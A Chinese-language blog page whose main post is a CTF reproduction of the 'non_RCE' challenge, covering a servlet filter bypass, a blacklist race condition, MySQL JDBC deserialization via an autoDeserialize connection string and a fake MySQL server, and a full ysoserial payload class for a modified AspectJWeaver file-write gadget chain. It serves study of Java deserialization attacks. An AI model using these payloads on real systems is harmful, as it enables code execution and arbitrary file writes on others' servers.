<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.3.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">

<script class="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"little-gu.github.io","root":"/","scheme":"Pisces","version":"8.0.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}};
  </script>

  <meta name="description" content="记录我的学习之旅">
<meta property="og:type" content="website">
<meta property="og:title" content="hungry and humble">
<meta property="og:url" content="https://little-gu.github.io/index.html">
<meta property="og:site_name" content="hungry and humble">
<meta property="og:description" content="记录我的学习之旅">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="热爱篮球和安全的小伙子">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://little-gu.github.io/">


<script class="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>hungry and humble</title>
  






  <noscript>
  <style>
  body { margin-top: 2rem; }

  .use-motion .menu-item,
  .use-motion .sidebar,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header {
    visibility: visible;
  }

  .use-motion .header,
  .use-motion .site-brand-container .toggle,
  .use-motion .footer { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle,
  .use-motion .custom-logo-image {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line {
    transform: scaleX(1);
  }

  .search-pop-overlay, .sidebar-nav { display: none; }
  .sidebar-panel { display: block; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">hungry and humble</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>







</div>
        
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <section class="post-toc-wrap sidebar-panel">
        </section>
        <!--/noindex-->

        <section class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="热爱篮球和安全的小伙子"
      src="/uploads/ckrie.jpg">
  <p class="site-author-name" itemprop="name">热爱篮球和安全的小伙子</p>
  <div class="site-description" itemprop="description">记录我的学习之旅</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives">
          <span class="site-state-item-count">9</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">categories</span>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>



        </section>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">
      

      
    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://little-gu.github.io/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/ckrie.jpg">
      <meta itemprop="name" content="热爱篮球和安全的小伙子">
      <meta itemprop="description" content="记录我的学习之旅">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hungry and humble">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">non-rce-ctf复现</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2021-06-29 22:02:28 / Modified: 22:38:03" itemprop="dateCreated datePublished" datetime="2021-06-29T22:02:28+08:00">2021-06-29</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="non-rce-ctf复现"><a href="#non-rce-ctf复现" class="headerlink" title="non-rce-ctf复现"></a>non-rce-ctf复现</h1><p>搭建环境，<a target="_blank" rel="noopener" href="https://github.com/Ant-FG-Lab/non_RCE">https://github.com/Ant-FG-Lab/non_RCE</a><br><img src="/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/1.png" alt="1"></p>
<h2 id="filter绕过"><a href="#filter绕过" class="headerlink" title="filter绕过"></a>filter绕过</h2><p><img src="/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/2.png" alt="2"></p>
<p>访问admin的路由会401，login部分的filter实现如下<br><img src="/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/3.png" alt="3"></p>
<p>这里是没有办法绕过的，关注AntiUrlAttackFilter中的代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (url.contains(<span class="string">&quot;../&quot;</span>) &amp;&amp; url.contains(<span class="string">&quot;..&quot;</span>) &amp;&amp; url.contains(<span class="string">&quot;//&quot;</span>)) &#123;</span><br><span class="line">        res.sendError(HttpServletResponse.SC_BAD_REQUEST, <span class="string">&quot;The &#x27;.&#x27; &amp; &#x27;/&#x27; is not  allowed in the url&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (url.contains(<span class="string">&quot;\20&quot;</span>)) &#123;</span><br><span class="line">        res.sendError(HttpServletResponse.SC_BAD_REQUEST, <span class="string">&quot;The empty value is not  allowed in the url.&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (url.contains(<span class="string">&quot;\\&quot;</span>)) &#123;</span><br><span class="line">        res.sendError(HttpServletResponse.SC_BAD_REQUEST, <span class="string">&quot;The &#x27;\\&#x27; is not allowed  in the url.&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (url.contains(<span class="string">&quot;./&quot;</span>)) &#123;</span><br><span class="line">        String filteredUrl = url.replaceAll(<span class="string">&quot;./&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        req.getRequestDispatcher(filteredUrl).forward(servletRequest,  servletResponse);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (url.contains(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">        String filteredUrl = url.replaceAll(<span class="string">&quot;;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        req.getRequestDispatcher(filteredUrl).forward(servletRequest,  servletResponse);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>会将;和./替换为空，可以根据这个访问/admin;绕过。官方wp解释主要目的是考察dispatch type，就是流量处理的类型。有FORWARD、INCLUDE、REQUEST、ASYNC、ERROR 5种类型。默认类型为REQUEST，在LoginFilter后添加</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dispatcherTypes = &#123;DispatcherType.REQUEST, DispatcherType.FORWARD&#125;</span><br></pre></td></tr></table></figure>
<p>请求就不会经过过滤器，就不能进行绕过</p>
<p><img src="/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/4.png" alt="4"></p>
<h2 id="jdbc反序列化和黑名单检测绕过"><a href="#jdbc反序列化和黑名单检测绕过" class="headerlink" title="jdbc反序列化和黑名单检测绕过"></a>jdbc反序列化和黑名单检测绕过</h2><p>攻击入口servlet.AdminServlet#doGet，实现了mysql的连接功能，并且jdbcurl我们可控。但是实现设置了一个黑名单{“%”, “autoDeserialize”}，预期解是利用黑名单检测逻辑存在的条件竞争问题。上代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BlackListChecker</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> BlackListChecker blackListChecker;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String[] blackList = <span class="keyword">new</span> String[] &#123;<span class="string">&quot;%&quot;</span>, <span class="string">&quot;autoDeserialize&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> DataMap checkDataMap;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">volatile</span> String toBeChecked;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BlackListChecker</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        List&lt;String&gt; jdbcBlackList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        jdbcBlackList.add(blackList[<span class="number">0</span>]);</span><br><span class="line">        jdbcBlackList.add(blackList[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        Map&lt;String, List&lt;String&gt;&gt; checkMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        checkMap.put(<span class="string">&quot;jdbc&quot;</span>, jdbcBlackList);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.checkDataMap = <span class="keyword">new</span> DataMap(checkMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setToBeChecked</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.toBeChecked = s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//单例blackListChecker对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> BlackListChecker <span class="title">getBlackListChecker</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (blackListChecker == <span class="keyword">null</span>)&#123;</span><br><span class="line">            blackListChecker = <span class="keyword">new</span> BlackListChecker();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> blackListChecker;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//黑名单检测流程</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">check</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        BlackListChecker blackListChecker = getBlackListChecker();</span><br><span class="line">        blackListChecker.setToBeChecked(s);</span><br><span class="line">        <span class="keyword">return</span> blackListChecker.doCheck();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//黑名单检测</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">doCheck</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (String s : blackList) &#123;</span><br><span class="line">            <span class="keyword">if</span> (toBeChecked.contains(s)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>生成单例blackListChecker对象，考察的是单例模式下条件竞争的问题。通过条件竞争来绕过黑名单检测机制，后续我把黑名单注释掉了，省了条件竞争的步骤。</p>
<h2 id="mysql-jdbc反序列化"><a href="#mysql-jdbc反序列化" class="headerlink" title="mysql jdbc反序列化"></a>mysql jdbc反序列化</h2><p>之前没有接触过，就复现一下。</p>
<p>复现环境commons-collections-3.2.1+jdk8u21+mysql-connector-java-8.0.13</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.ConnectException;</span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">        String jdbc_url =  <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections5_calc&quot;</span>;</span><br><span class="line">        Connection con = DriverManager.getConnection(jdbc_url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/5.png" alt="5"></p>
<p><a target="_blank" rel="noopener" href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p>
<p>生成恶意mysql服务端,运行测试文件，四次弹出计算器。(需要配置config.json中的yso命令参数)</p>
<p>漏洞分析参考安全科的文章以及各个版本连接字符串的总结<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/20308">https://www.anquanke.com/post/id/20308</a></p>
<h2 id="AspectJWeaver利用链"><a href="#AspectJWeaver利用链" class="headerlink" title="AspectJWeaver利用链"></a>AspectJWeaver利用链</h2><p>也是之前没有分析过，现在通过yso工具分析一波，利用版本&lt;=1.9.2。<br>利用链如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">HashSet.readObject()</span><br><span class="line">    HashMap.put()</span><br><span class="line">        HashMap.hash()</span><br><span class="line">            TiedMapEntry.hashCode()</span><br><span class="line">                TiedMapEntry.getValue()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        SimpleCache$StorableCachingMap.put()</span><br><span class="line">                            SimpleCache$StorableCachingMap.writeToPath()</span><br><span class="line">                                FileOutputStream.write()</span><br></pre></td></tr></table></figure>
<p>借助cc里的TiedMapEntry和Lazymap类，最后通过调用SimpleCache$StorableCachingMap.put()成功写入文件。</p>
<p>调试一下<br>HashSet中readObject()方法会调用put方法</p>
<p><img src="/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/6.png" alt="6"></p>
<p>进入HashMap的put()方法</p>
<p><img src="/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/7.png" alt="7"></p>
<p>调用hashcode()</p>
<p><img src="/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/8.png" alt="8"></p>
<p>跟踪到TiedMapEntry的hashcode()方法和getvalue方法</p>
<p><img src="/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/9.png" alt="9"></p>
<p>this.map可控，最后进入到LazyMap类的get方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">        <span class="keyword">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用put方法，最后调用栈</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SimpleCache$StorableCachingMap.put()</span><br><span class="line">                            SimpleCache$StorableCachingMap.writeToPath()</span><br><span class="line">                                FileOutputStream.write()</span><br></pre></td></tr></table></figure>
<p>写入文件。</p>
<p>但是这里的环境并没有cc链，需要自己构造，找到可以代替cc的触发方式，也就是出题人写的DataMap类里有相关替代方法。</p>
<p>参考大佬修改的poc。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"><span class="keyword">import</span> org.python.modules.time.Time;</span><br><span class="line"><span class="keyword">import</span> checker.DataMap;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@PayloadTest(skip=&quot;non RCE&quot;)</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;, &quot;unchecked&quot;&#125;)</span></span><br><span class="line"><span class="meta">@Dependencies(&#123;&quot;org.aspectj:aspectjweaver:1.9.2&quot;&#125;)</span></span><br><span class="line"><span class="meta">@Authors(&#123; &quot;sijidou&quot; &#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Antictf</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Serializable</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Serializable <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sep = command.lastIndexOf(<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Command format is: &lt;filename&gt;:&lt;base64 Object&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        String[] parts = command.split(<span class="string">&quot;;&quot;</span>);</span><br><span class="line">        String filename = parts[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">byte</span>[] content = Base64.decodeBase64(parts[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        Constructor ctor = Reflections.getFirstCtor(<span class="string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);</span><br><span class="line">        Object simpleCache = ctor.newInstance(<span class="string">&quot;.&quot;</span>, <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">        HashMap wrapperMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        wrapperMap.put(filename,content);</span><br><span class="line">        DataMap dataMap = <span class="keyword">new</span> DataMap(wrapperMap, (Map)simpleCache);</span><br><span class="line">        Constructor Entryctor = Reflections.getFirstCtor(<span class="string">&quot;checker.DataMap$Entry&quot;</span>);</span><br><span class="line">        Reflections.setAccessible(Entryctor);</span><br><span class="line">        Object entry = Entryctor.newInstance(dataMap, filename);</span><br><span class="line"></span><br><span class="line">        HashSet map = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">        map.add(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        Field f = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;backingMap&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Reflections.setAccessible(f);</span><br><span class="line">        HashMap innimpl = (HashMap) f.get(map);</span><br><span class="line"></span><br><span class="line">        Field f2 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;elementData&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Reflections.setAccessible(f2);</span><br><span class="line">        Object[] array = (Object[]) f2.get(innimpl);</span><br><span class="line"></span><br><span class="line">        Object node = array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Field keyField = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            keyField = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            keyField = Class.forName(<span class="string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Reflections.setAccessible(keyField);</span><br><span class="line">        keyField.set(node, entry);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        args = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;bbb.txt;YWhpaGloaQ==&quot;</span>&#125;;</span><br><span class="line">        PayloadRunner.run(Antictf.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>将DataMap类导入yso工具中，将原有链中的中间部分通过DataMap类中代替最后调用put方法，调用链如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HashSet.readObject()</span><br><span class="line">    HashMap.put()</span><br><span class="line">        HashMap.hash()</span><br><span class="line">            DataMap$Entry.hashcode</span><br><span class="line">                DataMap$Entry.getValue()</span><br><span class="line">                    DataMap.get()</span><br><span class="line">                        SimpleCache$StorableCachingMap.put()</span><br><span class="line">                            SimpleCache$StorableCachingMap.writeToPath()</span><br><span class="line">                                FileOutputStream.write()</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/10.png" alt="10"></p>
